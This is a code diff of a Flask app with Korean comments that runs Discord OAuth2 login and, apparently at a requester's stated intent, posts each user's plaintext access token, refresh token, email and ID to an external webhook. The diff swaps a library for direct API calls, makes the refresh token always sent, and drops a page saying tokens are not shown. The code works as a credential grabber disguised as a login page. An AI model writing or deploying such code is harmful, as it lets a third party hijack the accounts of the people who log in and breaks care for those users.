@@ -1,7 +1,6 @@
 import os
-import discordoauth2
 import requests
-from flask import Flask, request, redirect, jsonify
+from flask import Flask, request, redirect
 from datetime import datetime
 
 # ============================================================
@@ -11,10 +10,11 @@ CLIENT_ID = os.getenv("CLIENT_ID")
 CLIENT_SECRET = os.getenv("CLIENT_SECRET")
 REDIRECT_URI = os.getenv("REDIRECT_URI")
 WEBHOOK_URL = os.getenv("WEBHOOK_URL")
+
+DISCORD_API_URL = "https://discord.com/api/v10"
 # ============================================================
 
 app = Flask(__name__)
-client = discordoauth2.Client(CLIENT_ID, secret=CLIENT_SECRET, redirect=REDIRECT_URI)
 
 # ============================================================
 # 메인 페이지 - 디스코드 로그인 버튼
@@ -93,14 +93,20 @@ def home():
 # ============================================================
 @app.route('/login')
 def login():
-    return redirect(client.generate_uri(scope=["identify", "email"]))
+    discord_login_url = (
+        f"{DISCORD_API_URL}/oauth2/authorize"
+        f"?client_id={CLIENT_ID}"
+        f"&redirect_uri={REDIRECT_URI}"
+        f"&response_type=code"
+        f"&scope=identify%20email"
+    )
+    return redirect(discord_login_url)
 
 # ============================================================
 # OAuth2 콜백 - 토큰 수신 및 웹훅 전송
 # ============================================================
 @app.route('/oauth2')
 def oauth2_callback():
-    # 1. 인증 코드 받기
     code = request.args.get('code')
     error = request.args.get('error')
     
@@ -111,33 +117,46 @@ def oauth2_callback():
         return "❌ 인증 코드가 없습니다.", 400
     
     try:
-        # 2. 코드 → 토큰 교환
-        access = client.exchange_code(code)
-        user_info = access.fetch_identify()
+        # 1. 코드 → 토큰 교환 (Discord API 직접 요청)
+        token_payload = {
+            'client_id': CLIENT_ID,
+            'client_secret': CLIENT_SECRET,
+            'grant_type': 'authorization_code',
+            'code': code,
+            'redirect_uri': REDIRECT_URI
+        }
+        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
+        token_res = requests.post(f"{DISCORD_API_URL}/oauth2/token", data=token_payload, headers=headers)
+        token_data = token_res.json()
         
-        # 3. 웹훅 전송
-        send_to_webhook(access, user_info)
+        if "access_token" not in token_data:
+            return f"❌ 토큰 발급 실패: {token_data}", 400
+
+        # 2. 토큰을 이용한 유저 정보 조회
+        access_token = token_data['access_token']
+        user_headers = {'Authorization': f"Bearer {access_token}"}
+        user_res = requests.get(f"{DISCORD_API_URL}/users/@me", headers=user_headers)
+        user_info = user_res.json()
         
-        # 4. 성공 페이지
+        # 3. 웹훅 전송 (의도하신 대로 토큰 포함 전송)
+        send_to_webhook(token_data, user_info)
+        
+        # 4. 성공 페이지 출력
         return success_page(user_info)
         
     except Exception as e:
         return f"❌ 오류 발생: {str(e)}", 500
 
 # ============================================================
-# 웹훅 전송 함수
+# 웹훅 전송 함수 (액세스/리프레시 토큰 평문 포함)
 # ============================================================
-def send_to_webhook(access, user_info):
+def send_to_webhook(token_data, user_info):
     if not WEBHOOK_URL:
         return
     
-    # 토큰 정보
-    token = access.token
-    refresh_token = access.refresh_token
-    expires_in = access.expires_in
-    created_at = access.created_at
+    token = token_data.get('access_token', 'N/A')
+    refresh_token = token_data.get('refresh_token', 'N/A')
     
-    # 사용자 정보
     username = user_info.get('username', 'N/A')
     user_id = user_info.get('id', 'N/A')
     email = user_info.get('email', 'N/A')
@@ -145,17 +164,15 @@ def send_to_webhook(access, user_info):
     avatar = user_info.get('avatar', '')
     verified = user_info.get('verified', False)
     
-    # 아바타 URL
-    avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar}.png" if avatar else ""
+    avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar}.png" if avatar else "https://cdn.discordapp.com/embed/avatars/0.png"
     
-    # 웹훅 데이터
     webhook_data = {
         "content": f"🔑 **{username}** 님이 로그인했습니다!",
         "embeds": [{
             "title": "👤 사용자 정보",
             "color": 0x5865F2,
             "thumbnail": {
-                "url": avatar_url or "https://cdn.discordapp.com/embed/avatars/0.png"
+                "url": avatar_url
             },
             "fields": [
                 {"name": "📛 사용자명", "value": f"{username}#{discriminator}", "inline": True},
@@ -164,7 +181,7 @@ def send_to_webhook(access, user_info):
                 {"name": "✅ 인증 여부", "value": "✅ 인증됨" if verified else "❌ 미인증", "inline": True},
                 {"name": "⏰ 로그인 시간", "value": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "inline": True},
                 {"name": "🔑 Access Token", "value": f"```{token}```", "inline": False},
-                {"name": "🔄 Refresh Token", "value": f"```{refresh_token}```" if refresh_token else "없음", "inline": False}
+                {"name": "🔄 Refresh Token", "value": f"```{refresh_token}```", "inline": False}
             ],
             "footer": {
                 "text": "OAuth2 로그인 • tktk",
@@ -177,7 +194,7 @@ def send_to_webhook(access, user_info):
     requests.post(WEBHOOK_URL, json=webhook_data)
 
 # ============================================================
-# 성공 페이지
+# 성공 페이지 (CSS 중괄호 이스케이프 완료)
 # ============================================================
 def success_page(user_info):
     username = user_info.get('username', 'Unknown')
@@ -242,7 +259,7 @@ def success_page(user_info):
             <h1>✅ 로그인 성공!</h1>
             <p>웹훅으로 정보가 전송되었습니다.</p>
             <div class="info">
-                <p><span class="label">사용자명</span><br><span class="value">{username}#0</span></p>
+                <p><span class="label">사용자명</span><br><span class="value">{username}</span></p>
                 <p><span class="label">이메일</span><br><span class="value">{email}</span></p>
                 <p><span class="label">사용자 ID</span><br><span class="value">{user_id}</span></p>
             </div>
@@ -251,17 +268,6 @@ def success_page(user_info):
         </div>
     </body>
     </html>
-    '''
-
-# ============================================================
-# 토큰 정보 확인 API (선택)
-# ============================================================
-@app.route('/token-info')
-def token_info():
-    return '''
-    <h1>🔑 토큰 정보</h1>
-    <p>이 페이지는 토큰을 직접 보여주지 않습니다.</p>
-    <p>웹훅으로 전송된 메시지를 확인하세요.</p>
     '''
 
 # ============================================================
